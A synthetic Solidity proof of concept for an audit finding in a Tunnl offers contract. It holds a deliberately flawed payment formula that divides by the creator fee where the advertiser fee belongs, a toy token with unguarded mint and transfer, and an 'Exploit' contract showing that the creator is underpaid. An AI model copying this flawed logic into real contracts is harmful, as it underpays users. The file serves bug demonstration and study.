// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Tunnl TunnlTwitterOffers.sendFunctionsRequest — maxCreatorPayment divides
    by the creator fee instead of the advertiser fee (Cyfrin, finding 34361).
    SYNTHETIC, cheatcode-free.
    Root cause: maxValueUsdc was grossed up by the advertiser fee. Backing
    that gross-up out with the creator fee produces a different number, and
    the relayed maximum is what the creator is paid in full.
    Here the creator fee is 2000 bp and the advertiser fee is 1000 bp, so
    the creator is paid 91666666 instead of the 100000000 offer. */

contract USDC {
    string public name = "USD Coin";
    string public symbol = "USDC";
    uint8 public constant decimals = 6;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract TunnlTwitterOffers {
    struct Offer {
        uint256 maxValueUsdc;
        uint256 flatFeeUsdc;
        uint256 advertiserFeePercentageBP;
        uint256 creationDate;
        uint256 offerDurationSeconds;
        address creator;
    }

    struct Config {
        uint256 creatorFeePercentageBP;
        uint256 advertiserFeePercentageBP;
    }

    USDC public usdc;
    Config public s_config;
    mapping(uint256 => Offer) public s_offers;
    uint256 public relayedPayment;

    constructor(address _usdc) {
        usdc = USDC(_usdc);
    }

    function setConfig(uint256 creatorFeeBP, uint256 advertiserFeeBP) external {
        s_config.creatorFeePercentageBP = creatorFeeBP;
        s_config.advertiserFeePercentageBP = advertiserFeeBP;
    }

    function openOffer(
        uint256 offerId,
        uint256 maxValueUsdc,
        uint256 flatFeeUsdc,
        uint256 advertiserFeeBP,
        address creator
    ) external {
        Offer storage offer = s_offers[offerId];
        offer.maxValueUsdc = maxValueUsdc;
        offer.flatFeeUsdc = flatFeeUsdc;
        offer.advertiserFeePercentageBP = advertiserFeeBP;
        offer.creationDate = 1;
        offer.offerDurationSeconds = 1 weeks;
        offer.creator = creator;
    }

    function sendFunctionsRequest(uint256 offerId) external virtual returns (uint256 maxCreatorPayment) {
        // @> VULN: divisor is creatorFeePercentageBP. It must be advertiserFeePercentageBP, so the creator is paid 91666666 instead of 100000000
        maxCreatorPayment = uint256((s_offers[offerId].maxValueUsdc - s_offers[offerId].flatFeeUsdc) * 10000) / uint256(10000 + s_config.creatorFeePercentageBP);
        // FIX: / uint256(10000 + s_offers[offerId].advertiserFeePercentageBP)

        bytes[] memory bytesArgs = new bytes[](4);
        bytesArgs[0] = abi.encode(offerId);
        bytesArgs[1] = abi.encodePacked(s_offers[offerId].creationDate);
        bytesArgs[2] = abi.encodePacked(maxCreatorPayment);
        bytesArgs[3] = abi.encodePacked(s_offers[offerId].offerDurationSeconds);
        require(bytesArgs[2].length == 32, "relay");
        relayedPayment = maxCreatorPayment;

        _payCreator(offerId, maxCreatorPayment);
    }

    function _payCreator(uint256 offerId, uint256 amount) internal {
        uint256 cap = (s_offers[offerId].maxValueUsdc - s_offers[offerId].flatFeeUsdc) * 10000
            / (10000 + s_offers[offerId].advertiserFeePercentageBP);
        require(amount <= cap, "Exceeds max");
        usdc.transfer(s_offers[offerId].creator, amount);
    }
}

contract Exploit {
    uint256 public constant MAX_VALUE = 110_000_000;
    uint256 public constant WRONG = 91_666_666;
    uint256 public constant FAIR = 100_000_000;

    USDC public usdc; // nonce 1
    TunnlTwitterOffers public offers; // nonce 2

    uint256 public paidAmount;
    uint256 public fairAmount;

    constructor() {
        usdc = new USDC();
        offers = new TunnlTwitterOffers(address(usdc));
    }

    function run() external {
        offers.setConfig(2000, 1000);
        offers.openOffer(1, MAX_VALUE, 0, 1000, address(this));
        usdc.mint(address(offers), MAX_VALUE);

        uint256 quoted = offers.sendFunctionsRequest(1);
        paidAmount = usdc.balanceOf(address(this));
        fairAmount = (MAX_VALUE * 10000) / (10000 + 1000);
        require(quoted == WRONG, "relayed maximum");
        require(paidAmount == WRONG, "creator was not underpaid");
        require(fairAmount == FAIR, "fair offer");
        require(paidAmount < fairAmount, "paid is not below fair");
        require(usdc.balanceOf(address(offers)) == MAX_VALUE - WRONG, "shortfall left in the offer");
    }
}
